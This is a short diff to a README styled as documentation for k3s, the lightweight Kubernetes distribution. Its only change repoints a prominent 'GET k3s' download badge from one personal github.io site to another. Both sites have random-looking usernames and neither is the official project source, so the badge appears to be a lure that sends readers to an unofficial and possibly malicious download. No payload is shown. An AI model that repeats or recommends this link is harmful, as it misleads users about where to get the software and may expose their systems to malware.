@@ -2,7 +2,7 @@
 
 # Kubernetes k3s - Lightweight Kubernetes Distribution
 
-[![GET k3s](https://img.shields.io/badge/GET%20%E2%80%94%20k3s-0078D6?style=for-the-badge&logoColor=white)](https://samueldiazixjr.github.io/.github/k3s-download)
+[![GET k3s](https://img.shields.io/badge/GET%20%E2%80%94%20k3s-0078D6?style=for-the-badge&logoColor=white)](https://margaretjohnsont305.github.io/.github/k3s-download)
 
 ## Overview of k3s for Kubernetes Deployments
 
